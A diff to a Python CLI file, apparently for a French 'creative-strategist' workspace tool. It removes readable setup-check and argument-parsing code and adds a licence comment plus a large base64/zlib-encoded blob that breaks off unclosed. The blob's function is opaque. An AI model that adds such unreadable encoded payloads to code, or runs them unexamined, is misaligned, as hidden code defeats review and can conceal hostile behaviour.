-    for base in (os.environ.get("ProgramFiles", r"C:\Program Files"),
-                 os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)")):
-        for ver in ("root\\Office16", "Office16", "root\\Office15", "Office15"):
-            if (Path(base) / "Microsoft Office" / ver / "WINWORD.EXE").exists():
-                return True
-    return None
-
-
-def find_soffice():
-    if shutil.which("soffice") or shutil.which("libreoffice"):
-        return True
-    return any(Path(c).exists() for c in (r"C:\Program Files\LibreOffice\program\soffice.exe",
-                                           r"C:\Program Files (x86)\LibreOffice\program\soffice.exe",
-                                           "/Applications/LibreOffice.app/Contents/MacOS/soffice"))
-
-
-def find_ffmpeg():
-    return bool(shutil.which("ffmpeg")) or has_module("imageio_ffmpeg")
-
-
-def whisper_model_cached(size="small"):
-    hub = Path(os.environ.get("HF_HOME", Path.home() / ".cache" / "huggingface")) / "hub"
-    snaps = list((hub / f"models--Systran--faster-whisper-{size}" / "snapshots").glob("*/model.bin"))
-    return any(s.exists() and s.stat().st_size > 50_000_000 for s in snaps)
-
-
-def http_json(url, timeout=15):
-    req = urllib.request.Request(url, headers={"User-Agent": "creative-strategist-doctor"})
-    with urllib.request.urlopen(req, timeout=timeout) as r:
-        return json.loads(r.read().decode("utf-8"))
-
-
-KEY_WHERE = {
-    "GEMINI_API_KEY": "clé Gemini gratuite (facultative : sans elle, Claude lit les images clés) : aistudio.google.com/apikey, "
-                      "connecte-toi avec un compte Google, « Create API key », pas de carte bancaire",
-    "APIFY_TOKEN": "jeton Apify : console.apify.com → Settings → API & Integrations (5 $ d'usage offerts chaque mois)",
-}
-
-
-def env_fix(var):
-    where = KEY_WHERE.get(var, "crée la clé")
-    if WIN:
-        return (f"{where} ; puis dans PowerShell : setx {var} \"<ta clé>\" ; ferme et rouvre complètement l'app "
-                "Claude pour qu'elle la voie")
-    return (f"{where} ; puis ajoute la ligne export {var}=\"<ta clé>\" à ~/.zshrc, quitte et rouvre l'app Claude "
-            "(sur Mac, lance-la depuis le Terminal si elle ne voit pas la clé : open -a Claude)")
-
-
-def check_engine(engine, spec, live, root):
-    """Returns (status, problems, fixes, notes, manual). status: ok | missing | manual | unbuilt."""
-    needs = spec.get("needs") or {}
-    problems, fixes, notes = [], [], []
-    prec = needs.get("python_recommended")
-    if prec and sys.version_info[:2] < tuple(prec):
-        notes.append(f"Python {platform.python_version()} : marche encore, mais les nouvelles versions demandent "
-                     f"{prec[0]}.{prec[1]} ou plus. À prévoir : installer Python {prec[0]}.{prec[1]}+ (python.org)")
-    missing = [m for m in needs.get("python", []) if not has_module(m)]
-    if missing:
-        problems.append("paquets Python absents : " + ", ".join(PIP.get(m, m) for m in missing))
-        fixes.append(f"{PY} -m pip install " + " ".join(PIP.get(m, m) for m in missing))
-    for var in needs.get("env", []):
-        where, _ = env_state(var)
-        if where is None:
-            problems.append(f"clé {var} absente")
-            fixes.append(env_fix(var))
-        elif where == "registry":
-            notes.append(f"clé {var} enregistrée mais pas encore visible par l'app : ferme et rouvre complètement "
-                         "l'app Claude")
-    if needs.get("ffmpeg") and not find_ffmpeg():
-        notes.append("ffmpeg absent : certaines vidéos Instagram peuvent sortir sans le son. "
-                     f"Solution : {PY} -m pip install imageio-ffmpeg")
-    if needs.get("disk_mb"):
-        free = shutil.disk_usage(root if root else Path.home()).free // 2 ** 20
-        if free < needs["disk_mb"]:
-            problems.append(f"{free} Mo libres sur le disque, il en faut {needs['disk_mb']}")
-            fixes.append("libérer de la place sur le disque")
-    if engine == "whisper" and has_module("faster_whisper") and not whisper_model_cached("small"):
-        notes.append("modèle Whisper « small » pas encore téléchargé : environ 500 Mo au premier usage")
-    if needs.get("free_ram_mb"):
-        total, avail = ram_mb()
-        if avail is not None and avail < needs["free_ram_mb"]:
-            notes.append(f"seulement {avail} Mo de mémoire libre ({needs['free_ram_mb']} conseillés) : ferme le "
-                         "navigateur et les applications lourdes avant la transcription")
-    if engine == "auto" and not find_word() and not find_soffice():
-        notes.append("ni Word ni LibreOffice : les documents sortiront en .docx seulement, sans PDF. "
-                     "LibreOffice est gratuit : libreoffice.org")
-    if live and engine == "gemini" and env_state("GEMINI_API_KEY")[1]:
-        try:
-            d = http_json("https://generativelanguage.googleapis.com/v1beta/models?key=" + env_state("GEMINI_API_KEY")[1])
-            n = len(d.get("models", []))
-            notes.append(f"la clé Gemini répond ({n} modèles visibles). Le niveau gratuit, lui, se vérifie au premier "
-                         "envoi de vidéo : s'il refuse, l'analyse passe aux images clés")
-        except Exception as e:
-            problems.append(f"la clé Gemini ne répond pas ({type(e).__name__})")
-            fixes.append("vérifie la clé sur aistudio.google.com/apikey")
-    if live and engine == "apify" and env_state("APIFY_TOKEN")[1]:
-        try:
-            d = http_json("https://api.apify.com/v2/users/me?token=" + env_state("APIFY_TOKEN")[1])
-            data = d.get("data") or {}
-            if not data:
-                problems.append("le jeton Apify ne renvoie pas de compte")
-            else:
-                notes.append(f"Apify répond : compte {data.get('username')}, plan {(data.get('plan') or {}).get('id', '?')}")
-        except Exception as e:
-            problems.append(f"le jeton Apify ne répond pas ({type(e).__name__})")
-            fixes.append("vérifie le jeton dans Apify > Settings > API & Integrations")
-    if spec.get("field_tested") is False and spec.get("implemented", True):
-        notes.append("branché mais pas encore essayé avec une vraie clé : fais un premier essai sur une seule recherche "
-                     "ou une seule référence, et compare avec la voie gratuite")
-    if not spec.get("implemented", True):
-        status = "unbuilt"
-    elif problems:
-        status = "missing"
-    elif needs.get("manual") and not needs.get("python") and not needs.get("env"):
-        status = "manual"
-    else:
-        status = "ok"
-    return status, problems, fixes, notes, needs.get("manual")
-
-
-def doctor_without_yaml():
-    req = HERE.parent / "requirements.txt"
-    names = []
-    if req.exists():
-        for line in req.read_text(encoding="utf-8").splitlines():
-            line = line.strip()
-            if line and not line.startswith("#"):
-                names.append(line)
-    mods = {"pyyaml": "yaml", "python-docx": "docx", "pymupdf": "pymupdf", "pillow": "PIL", "av": "av",
-            "faster-whisper": "faster_whisper", "yt-dlp": "yt_dlp", "openpyxl": "openpyxl",
-            "imageio-ffmpeg": "imageio_ffmpeg"}
-    miss = [n for n in names if not has_module(mods.get(n, n))]
-    print("Il manque des paquets Python. Installe-les en une fois :")
-    print(f"  {PY} -m pip install " + " ".join(miss or ["pyyaml"]))
-    print("puis relance doctor.")
-    sys.exit(1)
-
-
-def cmd_doctor(a):
-    if yaml is None:
-        doctor_without_yaml()
-    md = modes_data()
-    root, ws, P, state = None, {}, None, None
-    if a.folder:
-        P0 = paths_of(a.folder)
-        if not P0["workspace"].exists():
-            raise WsError(f"pas de workspace.yaml dans {P0['root']}. Sans dossier : ws.py doctor --mode free|hybrid|paid")
-        P, ws, state = open_ws(a.folder)
-        root = P["root"]
-    mode = a.mode or ws.get("mode") or "free"
-    if mode not in MODES:
-        raise WsError(f"formule inconnue « {mode} » ({', '.join(MODES)})")
-    eng = dict(md["modes"][mode])
-    overrides = ws.get("engines") or {}
-    if not a.mode and isinstance(overrides, dict):
-        eng.update({k: v for k, v in overrides.items() if k in md["tasks"] and v in md["engines"]})
-    cap = ws.get("capacity") if isinstance(ws.get("capacity"), dict) else {}
-    total, avail = ram_mb()
-    print(f"Formule {mode} · {platform.system()} {platform.version()} · Python {platform.python_version()} · "
-          f"{os.cpu_count()} cœurs" + (f" · mémoire {total} Mo ({avail} Mo libres)" if total else ""))
-    print(f"Tiers : {md['tiers'][mode]}")
-    print()
-    icons = {"ok": "✅", "missing": "❌", "manual": "❔", "unbuilt": "🔧"}
-    optional = set((md.get("optional") or {}).get(mode) or [])   # a free extra: its absence is not a problem
-    blockers, degraded, effective = 0, [], {}
-    for task, engine in eng.items():
-        spec = md["engines"].get(engine, {})
-        status, problems, fixes, notes, manual = check_engine(engine, spec, a.live, root)
-        icon = "💡" if status == "missing" and task in optional else icons[status]
-        print(f"{icon} {md['tasks'][task]}\n      {spec.get('label', engine)}" + (" (facultatif)" if task in optional else ""))
-        if status == "unbuilt":
-            print("      pas encore branché dans la suite")
-            if problems:
-                print("      à préparer pour ce moment-là : " + " ; ".join(fixes or problems))
-        else:
-            for p in problems:
-                print(f"      problème : {p}")
-            for f in fixes:
-                print(f"      solution : {f}")
-        for n in notes:
-            print(f"      ⚠️  {n}")
-        if manual and status in ("manual", "ok"):
-            print(f"      à vérifier à la main : {manual}")
-        effective[task] = engine
-        if status in ("missing", "unbuilt"):
-            alt = None
-            for fb in ((md.get("fallbacks") or {}).get(task) or {}).get(engine, []):
-                if check_engine(fb, md["engines"][fb], False, root)[0] in ("ok", "manual"):
-                    alt = fb
-                    break
-            if alt:
-                if task not in optional:
-                    degraded.append(task)
-                effective[task] = alt
-                print(f"      → utilisé à la place : {md['engines'][alt]['label']}")
-            else:
-                blockers += 1
-    print()
-    machine = cap.get("machine", "own-pc")
-    if machine == "own-pc":
-        thr = md["capacity"]["machine"]["own-pc"]["warn_ram_mb"]
-        if total and total < thr:
-            print(f"⚠️  Machine : {total} Mo de mémoire au total. Ça marche, mais ferme tout le reste pendant "
-                  "les transcriptions, ou passe sur un VPS (capacity.machine=vps).")
-        if avail is not None and avail < 1500:   # 195 Mo libres ont figé Chrome deux fois (test du 06/11/2026)
-            print(f"⚠️  Mémoire libre : {avail} Mo seulement. Le navigateur peut se figer et Whisper ne pas charger : "
-                  "redémarre l'ordinateur ou ferme les applications lourdes avant la recherche (1 500 Mo libres conseillés).")
-    else:
-        print("❔ Machine : VPS — à vérifier à la main : bureau à distance ouvert, app Claude installée dessus.")
-    print(f"❔ Claude : {md['capacity']['claude'][cap.get('claude', 'pro')]['label']} — à vérifier : app Claude ouverte "
-          "avec cet abonnement.")
-    print()
-    if blockers:
-        print(f"❌ {blockers} tâche(s) sans aucun outil qui marche : applique les « solution » ci-dessus.")
-    elif degraded:
-        print(f"🟡 Utilisable. {len(degraded)} tâche(s) tournent sur l'outil de secours au lieu de celui de la formule "
-              f"{mode} : {', '.join(md['tasks'][t] for t in degraded)}.")
-    else:
-        print(f"✅ Prêt pour la formule {mode}. Restent les points ❔ à vérifier à la main.")
-    if P is not None and not a.mode:
-        state["effective_engines"] = effective
-        state["engines_checked_on"] = today()
-        refresh(P, ws, state)
-        print("Outils réellement utilisés notés dans state.yaml et COMMENCE-ICI.md.")
-    sys.exit(1 if blockers else 0)
-
-
-# ---------------------------------------------------------------- main
-
-class FrParser(argparse.ArgumentParser):
-    def error(self, message):
-        self.print_usage(sys.stderr)
-        print(f"ERREUR : commande incomplète ou mal écrite ({message}). Aide : ws.py -h", file=sys.stderr)
-        sys.exit(2)
-
-
-def build_parser():
-    ap = FrParser(prog="ws.py", description="Workspace de la suite creative-strategist")
-    sub = ap.add_subparsers(dest="cmd", required=True, parser_class=FrParser)
-
-    def add_init(name, default_programme):
-        p = sub.add_parser(name)
-        p.add_argument("folder")
-        p.add_argument("--name", required=True)
-        p.add_argument("--business", default="")
-        p.add_argument("--mode", choices=MODES, default="free")
-        p.add_argument("--stage", choices=STAGES, default="new")
-        p.add_argument("--programme", choices=PROGRAMMES, default=default_programme)
-        p.add_argument("--kind", choices=KINDS, default="product",
-                       help="product (une page, une commande), digital (un produit numérique payé en ligne, accès immédiat) "
-                            "ou webinar (un live gratuit, une inscription)")
-        p.add_argument("--path", choices=PATHS, default=None,
-                       help="full (le premier cycle finit par UN document complet, relié à chaque étape ; par défaut "
-                            "pour init) ou stage (un document par étape ; par défaut pour adopt)")
-        p.add_argument("--market", action="append", help="CODE:Pays:DEVISE:langue:paiement, ex. GN:Guinée:GNF:fr:cod")
-        p.add_argument("--channels", default="meta")
-        p.add_argument("--shop", default="")
-        p.add_argument("--goal", default="")
-        p.add_argument("--budget", default="")
-        p.add_argument("--team", default="")
-
-    add_init("init", "none")
-    add_init("adopt", None)
-    for name in ("status", "next", "check", "repair", "bilan"):
-        sub.add_parser(name).add_argument("folder")
-    sub.add_parser("overview").add_argument("folder", nargs="?", default=".")
-    p = sub.add_parser("cycle")
-    p.add_argument("folder")
-    p.add_argument("--from", dest="start_from", choices=CYCLE_FROM)
-    p.add_argument("--force", action="store_true")
-    p = sub.add_parser("doctor")
-    p.add_argument("folder", nargs="?")
-    p.add_argument("--mode", choices=MODES)
-    p.add_argument("--live", action="store_true", help="tester aussi les clés Gemini et Apify en ligne")
-    p = sub.add_parser("step")
-    p.add_argument("folder")
-    p.add_argument("step")
-    p.add_argument("status")
-    p.add_argument("--output", action="extend", nargs="+")   # 1.6: --output a b, or --output a --output b
-    p.add_argument("--note")
-    p = sub.add_parser("start")
-    p.add_argument("folder")
-    p.add_argument("step")
-    p.add_argument("--reason", default="")
-    p = sub.add_parser("code")
-    p.add_argument("folder")
-    p.add_argument("prefix")
-    p = sub.add_parser("log")
-    p.add_argument("folder")
-    p.add_argument("text")
-    p = sub.add_parser("team")
-    p.add_argument("folder")
-    p.add_argument("action", nargs="?", choices=("list", "add", "remove"), default="list")
-    p.add_argument("name", nargs="?")
-    p.add_argument("--role")
-    p.add_argument("--contact")
-    p = sub.add_parser("set")
-    p.add_argument("folder")
-    p.add_argument("assignment", nargs="+", help="clé=valeur, plusieurs séparés par un espace ; market=CM ajoute un marché")
-    return ap
-
-
-def main(argv=None):
-    a = build_parser().parse_args(argv)
-    cmds = {"init": lambda: cmd_init(a), "adopt": lambda: cmd_init(a, adopt=True), "status": lambda: cmd_status(a),
-            "next": lambda: cmd_next(a), "check": lambda: cmd_check(a), "doctor": lambda: cmd_doctor(a),
-            "step": lambda: cmd_step(a), "start": lambda: cmd_start(a), "cycle": lambda: cmd_cycle(a),
-            "code": lambda: cmd_code(a), "log": lambda: cmd_log(a), "set": lambda: cmd_set(a),
-            "repair": lambda: cmd_repair(a), "team": lambda: cmd_team(a), "overview": lambda: cmd_overview(a),
-            "bilan": lambda: cmd_bilan(a)}
-    try:
-        cmds[a.cmd]()
-    except WsError as e:
-        print(f"ERREUR : {e}", file=sys.stderr)
-        sys.exit(2)
-    except PermissionError as e:
-        print(f"ERREUR : fichier verrouillé ({Path(str(e.filename or '')).name or 'inconnu'}) : ferme-le dans les "
-              "autres programmes (Word, OneDrive, antivirus) et relance.", file=sys.stderr)
-        sys.exit(2)
-    except OSError as e:
-        print(f"ERREUR : accès au disque impossible ({e.strerror or e}) pour {e.filename or 'un fichier'}.",
-              file=sys.stderr)
-        sys.exit(2)
-    except Exception as e:  # last resort: one line, never a traceback
-        print(f"ERREUR inattendue ({type(e).__name__} : {e}). Lance « ws.py check <dossier> » puis, si besoin, "
-              "« ws.py repair <dossier> ».", file=sys.stderr)
-        if os.environ.get("WS_DEBUG"):
-            raise
-        sys.exit(3)
-
-
-if __name__ == "__main__":
-    main()
+# Creative Strategy OS, sous licence. Usage personnel, non transférable.
+import base64 as _b, zlib as _z
+_s = (
+    'c-pnSUvDHwk|+4iPZ5_reGySgW)-VfJ9F7$3lxi0VymjiVNud(SlmP~Gm;E3Ga?m{!9SgqhsFZCivbQ8V0K>aFo*8Fhq<o3y~92%'
+    'Fnj2?Chm*q3+#M^v!9u}hkHb1k|k*csF)Gqf6dL!&CKmjGM#1l+>7$_S(F#?Mk3FnXdcg#Y3xOXH=66W@@JBq^~!lN(Qm&kvQ+=h'
+    '3jJ#~iRR-hpX%q_v|U`-wToL*rOYR2JCDCB<6^!s&a<gEi{=;fQg!Ve(&NTFzwK{$^dHsj74uP6&Z*KcOUKE1na4q#4zp2`o^Si*'
+    'e7yM=erOkt^ZcH|@y#%v&AmPTlVqv%HH(U(>RAovHkwX!`F(!1m*-h7W$@A4_FiXcyz%+o(H{NA@Pol%oJ``uAf#~=+2kq?!X5!X'
+    'PUjoX4~|~#98<xqjaLWH_TJF1z#r#v>~}r?;`S_0M))<0=x@03=6L6YDwD?7_&{Kb&L&B55##&e(ZP$Ooma1P85#%*MZ;k{iE~=v'
+    'GN)1u=F21<6?#@*?7x2Y2CW}|`9{^9XQK>tM;U=ien?}*Wip$^YBW@S@cf7>ETlr;^Y4D|jiV%wtIG5;PQ77P=7nj9-chN!(;~eq'
+    'qH=!sKK7RzM|;l)hxE_>U#S7@yhPdKWBj}S0{?!)zjt5KP<9D+c5$cnM^t<FfXkxjH@h$QXwV0*xLI0}ILe0?JdinHbbgE91o?Pe'
+    'Q2Cu_0|zktf!8F@M&%Irf~P#bN@Pj$I2v&iljJIv#Vd=Lm+>;0Oyt*flBO{h10#L&<!8_KkJL0rFO#!8%DIK(<nlPX<Qb>5(C2wH'
+    '<=1(X7Q;N5%^9FOX*9VlV*dS{io_W9*ZZ%jy{zb^^upWT_WX42ZybI@Fa6o={DMa9C1Vf8;z<$fm%s2gHii?zeDCXmF*`83BDA)}'
+    '#wZ?pX&jFR!1+LZqV{+TBn9sQd5Qn>D4{NNi(~)r_M4qoFTH7$(#G$3JUN2Q<|Ov|-s13^rMF3hAeniIeDP+tXqcwO9RtFHd3-Yu'
+    'W~%2ry4IU*hFwPA&u-^&5eOw9vgFaWr{)O4yz4iMgt2-!+j{!(Q$MW6YIeLCd^|7n6kYU2L`FtTK|)hR5rZ$&1mB)<35zD^|A_v~'
+    'leCOC+MD!=cqZxQmY(7yixg~UU5{Qw<z&7Mpz2kqrmI1pW<-N~@l8_9i@=(Y>P$7luK_!1z=q>SWA1b!L{tca=oQg89$-uXic4WN'
+    'asH0w<VoZBuoiwA<(JgPc|4Ei^E`-U+ni0}=>VT-1$a)T{Pjhg6SjKTV3XuLjlBiR^(G1Z{K(r{GSYIZg0;S>dXc1<lkWvY5letG'
+    'OKHL9aXunCL(A_m&h<T<ML@?<OhYYZ(J(GTZq|Q0_kkh|oqF>%6z(i$yt9@I9`cgfCFC6^!;2)&y%cmAJH;ziw^z|58N~|>a@q5C'
+    'vpi4E8Q-&#mVuC*P9{&c**l9ay~0l>9<OHH>x3K4mBf&FjnsCNA>)mp(5RfwDiosED^SN-bZWB=hxj<<Q@l6KX17n#<g9m{%r6EQ'
+    'aUcVy74k85Kde@CK1F{k%F;*QT6`+vWwSU9=sjp8Awm7H?h@6x1~zQ_Z&N=6x{cjoR`?141ekc&8+Sb-BiZ$!lx@0woR@@*1s#5a'
+    '%lNj~ejX9<x-^8*{9=1+>q#{#BB6Oqyv;C{Va*)uKaBHfQWS)1wLM=ad3tR<V8#{kBw0y^!QFc=$Vz$y1C}zn&<RMWK)VFgeoA9H'
+    'NaJTY9VI{&d?z|`mE>g+_PpoRJ7ZA{c54!)!`PcdL~Eu*T1RnDQxiIyqg%b68jI#V@O(Y>t(O!TxVLB?s7h&e-ChN3VvoNPdzFvz'
+    '82CT`X7lIM&7Y6FpMT!}`77#pp!peQhq%QlLB1GZMRddGlk6;-cv6<%Sci%xY^tTksbYGlh$VAfk3FAz>Zvos!fnvVq~KG9U=>IU'
+    'v^$dFyoT-W`dJO~0@Bh^GiQ8W<#+GZF%^Rb6gcF)A<<S^r+8EG6ttmwzO#$foEb2*$7h3NRMg;oQk?k2_nq?jRe&_v5Ipfwt?*Az'
+    'twtu%Sv(1fWTaYJU(?z5x-;SxsDA4iSoDaJ<E)}iXe*){d%W~4Ljez846<>MXW5)~Rbd}pc&AAaeuqSFW`wT9B;|p{B6H#Ef{M~V'
+    'G>yfQ-wexQPW&t0%4oPVA_ZIo6R{Tfx=@QN#8EY&hP&|5J+YlKO8+{`FZn!BuYgGAogh=i_E}}r8&iV%p4)Bkv-$ch@xjEfS>M&0'
+    '-gKmD=XUG62gJ|6-rd{W-`!V5a^g$}#J|TkR=J5{8}XY8(4j;CC``9pXO!es4FROUu&RKvN7Yk^853ctS38lnr+~NJ5WiK>#+olR'
+    't9U(NFw`)7;SX<z698)q%ve_9ye{Z*aoP8tF!o*odma9M$xs3UQ@MivX9$;g6e(m`p?$TpP%9pf;~}=?AWqNe5aAZ^A*CZ9)qOSI'
+    '2=JW;SA@G4ktPk!L8&IdrJNHXIKG_;1K9PxiYBG}4p*NH6?%aAMSn|T7s|Q!r~k`aTrIsn{jp2*hJ-45Mf5+-re`@Z%`chS_puFT'
+    'w=^6Q5p(a8QAUSRod3!<M4U)E*c}Ca{<mV+YxI!6Hprnn;Epxk)Q_0Up)=<!BY_5RpWZvRPPndn!6RAU@I%KkDS0pxa81nM-Mybj'
+    'Guj3Z8xl8nqHvNZp~eGiVDhc&ZDD7~gVfc?OSSCc8l}S;Woj+cMy&LhbRi52yF(34zvredyWSIOWNb?J7MDxvdc{6+Pl);<#A}p}'
+    'Gd&@5YH(M@x^orPT2EECp_76q)7ZZEqepWiH&I3P)hx=LIwt`al??;_b8uY*<7_gD^|q}uC5K>X^%<v1+Jinku?~~dHkqtO1AHIb'
+    'XcT+yc_U2Wf|}!#>J*{_u^Y_tMOX3A;B%5DbFX6+?0B1-%w~W8+kd3it;4ipmfTTx2_~yHra4AeZp7NS+X;ggXgY?iN#t!v3~(Q^'
+    'QC#Lk=ZK>{(z1}-AfyT{1+@SlEJl3+<P@%e5B>n3DxtS3#Efh*TfIUykp}-4ofR>Oo5Yb{kyv*hb@74;&6l|H88mPOi5)4%F^nd|'
+    'k|2PEpOwVkqLdOLiM#hLnnY8sQ*vh=^*kJQEI0&Qy3&F=4-~I~Pb|r6{J!QM7;u_FsX*5}{VGw-t^ifz50cpu<`CR>Oq+VwISKDU'
+    '=V#uprIWYm+jRFL`mQAMe)oQuK=Ok0Gn9A3EG?imV1bu5N{^%`FQNhBSfi3D$N?dh_iZ$#1@57_PU!S|eUXXcEKW(x%2FXXyKe?x'
+    'zS%nhcjOyv*=QT<*x&RPEFCRr^ZmW&L;pDTPv~UNmZu(T8qkMQFog7(q(dym643bp!llJPu9Pk#XdVgoDsi%VpCkzcJUV#E64t`6'
+    '<QUe|;_2=W=d9n1N69<`V@Xm{$~tBojSzt3?T|<o>z+a2pa+Z7l2xqbZ7kKO1tJvuNbj@jRNfO~J<Agu;Yy!8oMeT3ie@tcAV&K&'
+    'F-*nIY^GVaX*@ln{X;ZMA-63nsE@8Bc5=gq;0=pOwPX55AIT)3csJ4r=&B!{)=Eyh%yy{5`$P$4!zqYOG!3-&#od&^G<D!aJ^LU*'
+    '9r|cZMw7Rw7qQZrb-K}L<oD|bam1R2wc_lEi83uWag&B@ai0~@qPD%x&UJ*NB+q~vvd+%IANBYXprd~B(UE$LIqSwS?&Np>h024='
+    'm8xKM!2)BYd*5bB8bEJyx%2{JgF~Me2`tW4XgcW8j++vN3d5zfjTP|hb>&wy-kTFyzSG_$yN0~!{SVs;VEWCe(@qbVmX3mj)a$Fl'
+    'kf^eWJoB`vBcD-}@H=AhFzTt_@@;7;x=7U4m<VPB{ZwjKqqeJ`&({{uWzq4mfA=@vmC1~C=Q6sbB02;)2GfZQ@^mSRPBmnU0{KED'
+    '@7@P-sA<roj%;~6&8}h#-zM>R{vmKCsu9Ql1teh;<WzM+rwUpQ(J3C#X1E@e1c^k!Mo3iYUzvfL_;>FaLY>uXfF6I^H2`@@avP);'
+    'Zkq1Yp2h2GibVB@wf7I9OsB(?*rCx|J%<n6uJokQu=CN=r~ec2gB@!)LIO9cPRE^>rY9oT3r#tN=q<f|r@B%xD_$S@xZ`<$`X_H;'
+    'uz>hcAY_M6M8QdJR#8;mO2olCkF=#3lk9gk&YI?KPRy=5b?WH1RkhHXX@~fTAqmvPM$o|xri`hfU`(u6m%y#g{%r!T7hFYo5<&4d'
+    '@)d)S##7=2>4dnV0~Iji(=&&x&bmPGtx7AF6ZeM83znbsby_|LTOJg>Vm3)=)P0`a2~!j2|I_fK|FLY907~qx$ej5t{U~!NZ0Hwt'
+    'e%_^4Z*jJq%rvXQ>xKI?>G0IXy*%!X%gJOK&4(9(f3mar*Qbl8OCQaT^iEwZx=e9<N}L9^V4+C(B$m1~4BCPjL6@(D2{`2qeVos8'
+    ';&i9cw`D;LF#QbTo1XXLb^k?~q{OxLU%Y<aALo5)LvJ12OGLMP&fu>)WU$1n5zA8Wm&{aTbH2-+W@ia7=EDX~d^@iuzod@%bwXP('
+    'O-lwkxJY!>_0Un*lWsznp;%y8I2&Y@e6>vcLM@oDR}3%B;`vy;GCD_H{AA#dbGbym#lZYN&mZqG^`+c=@4p_r-g&jhS9(3j88oKA'
+    '|5w4z%Xi1e@AhB3`{wxF?#p+(2VwB`?P#&p{TItH_;mYZ(0luK(>s0lXCZY#RreL97Q-kVVDN>oD_Q}T&6M)t$y${HWKiJr3FJ|&'
+    'cO>Fz#8X>ed1}Z>j^?<o!_wp{?xRp;%vE|h?hyk2ksmf?2vA!aNIk*xF%#*qQ5@Hc%|?W3Kn$Dq&WX961zTaSB+eiY!q&nBsuQY!'
+    'lVuv+1p2Yd3Pat-)6fWP<A!K%DS1UUuN2(1ua$^v>y0XiQqhK%ms>lj^ROuD=%7xlD}t$@mqjXS_{GTe5l{&SeUQt5LrsfEu}DvK'
+    'O<3;q=)3%7Z7l%DY6WcQT5neX8T$hF4sA$?-}p`^Hl3MDYrbLKf>%p}Vzu?atJRCZW(R0S1HyE(Vin}d^1-XHd*H%-_&~T1KM?M)'
+    'p|K&(&n~RD46JX5bx^aewD32atqX}Mpf5eOfgeXBeQk$Bu<;q!3+ujX3m#pjngzO?%690DY2%RKKyuLAw`aRd5}$%3(i77`tsokQ'
+    'VH+4~P*@2B*{SND1SgkyYN2QilMGY1T9>m)HoRnc;byM6g}14`YApJ!mOj}!6=Meb!%DM;cCh@bO)u@geOo*-n8jW58S&~z!9<;q'
+    'R7y$f&~K#YgE8@G1?w5rZJO$Zgc2Mia!3?8uu5OI$vpvaX~VdoU2iSZrd@}P7Pv2c#i(`-tmAwZK>X|YEJ>r>w>c&nh?Fbyi7&c='
+    '0Ph3yK`|sDZmrq2Knj`fR9aJE^KOQNp8#b67>15Y0PWb<jNq|I_$M}s4OyUPMQxAS?9RwflzkXPx2WV<GGolsRrX$JE}1j4*`bj!'
+    'ka{#B@0Tn&DZwL7l_5^wQ$=KIePZd*PCVD|c}iU~6dDz6#;Yiqc-h_mOT*2^W3)$t8Efw7pEz`{f}B;O;;gA@1%_V(2Fttt1a=e2'
+    '4T*1+{e*W#<>{IJ1$&M=dYI+8!070jG#fS04vWR$q;pSmih+#D;z==Tqg!Iee&vX38uC8YWtt^o^kI5Xjp#0-A#;p{rNYv$8aUr9'
+    '(1!5PJ{J0pjS-Hq+_ocSR3+hf9x>f84G%9O5_Tr$*s>5`_o=mP^JqYHOuZezc69|(H=r`{lM(T`$v9zYs#I!oZ&uRqh6$?zy;szM'
+    '7nn|){e`Z@6!mDC)hXNw4z&m-&vgb&U-aAD*NXcQRrJ0~5(jC2{1u7aoP9x}Capfp#Lws~xQuBpRAY6mGGHu?Ta_M7D$eJ@6X7Oc'
+    'P@|7Cu@#0Tbv8|gh258VNz@@8fId|Hte~wBVKj)tjl-Se&z12raW={h0@%6nZ12tS{_CCN{e#z1fXO5k_^wQTqiSj!WUdRvF>NQ9'
+    '8#D5dyjitpf5g_7`(cu!K07%0V({j8?@&6S!;9d>q9yjcSWw(!Da=j0-1%(prKrqR8`R}XTC6M)?Euj|h~QPzeXsLU6UVtGpB=kH'
+    'v=HIK=pv@a*cpI)6Mg*q^CY%L#2pu&dRlH^c7taJyS2eR-{1XwZ*%YU@zLI%Ju3g;`SYVazc!GgJt}=f|JO(H=J;smc<;sjo;!li'
+    'j`sJSzp2?v)BD4tgJ)mvVpT2c=|0R|XdnkKxs^#&rfT{-uXp!e(HOOXHNV{3J^oTg2)0FxZv3xyj`jsx^r}MYlT|fi+}u6dqe5SC'
+    'W&L|oeg4J|D>EisG8zF`VY_X4BxJb$CiMiN<)~$}RQoW?E(fs13aU$hex>0s{Xt!-(7A4M!tBIG%?71mp}-q#i;4Rda~ZV)19$<*'
+    'P*)hiht`PYhTc$2VZ<EveiY+4&7m4oOup7^!9)iY9^;-%<KRhgx`Z`TWqwd?K%uf15p!lIh3NeWTI0~@ue9DDP#YU=TDU|E7`K^V'
+    'q66s|hwsRj5v0rBC>!2L&#CEIkc66BQzbM#g|^{x8efB}5&k#e@zL~pfEk-e4yNo_V`hq(g_TwJlbY@bp9zuihxJ+6B|YJf5HY@V'
+    'pvOtT?Z_F-bJlji)DNB;1NcOZG*mZbG^b)PoQ|O5c@*X6H7ti!0^8zu7TT;5HF~pKf7x-34X7lzrRvtkTih)DN=M9%D|`Y;F6Z%p'
+    '*T-V`)o$o|hxW1bQ2RxOf18<#7&UgQ<3|~rbd|A*BlQ+atJv^$S!2tuB|U&2YymF;7Dd}rDqW>@z~Jj@LSUplY#w*_)i2G@iW7wr'
+    'r%j!eT1Nkfc4nM|^QGl0S-Yu@MWwRFkz;7HVy11}@HaOZ3q?}+{@?zcXK(h$*eH*il$Ey(PPE=^H12uN)Qw{yN?>i~;NAV6SUxey'
+    '=R4wF$4rEJID<w1t^#-Nt2F|{Dy~I}!0u+m=|k!6uP|se$DIQu2%p%tD`n6+yisx`pvRpBM!Xb-@`<vNJyn`zV(Y}+g?9Ka_5CK='
+    '3zycEFESWnj5}gPj8^!UzSqzkKBOuDU*BwuJI3(Xu7i6pb|A0?x?e)1i{^7B5cRnR`$;5I^s}*QTDV06v(z@fV4;9bj52t3oG?_#'
+    'F{cxAhy_hi&)D>^+g^SS`-k-Iea|~6uX3@jE|V)6wp@ZqPnM+(m^xyyn1v>o!xSeMW?FcXt{6@M5&0?yIA8Gh^XNRKrsE={;W4RV'
+    'gN^|k<PN};>AQQEVresj5m3pZQgW)pBE|8K`~E-ugX0?a&%gWKA8fa{@BiW7)STkJ|J(ojzx~(0Rc3L+Xl4n6^c0a$bh}a*tO~Si'
+    'Khl^L_2bUZYFB+UghQ<%kd+&%O-6G{I&vp9?mQ=<rKA;j^vF~P45-edN4Nr1S_XWF&tf_DS4p67XjI#oSLlKeH_H>+F?M50sJFT^'
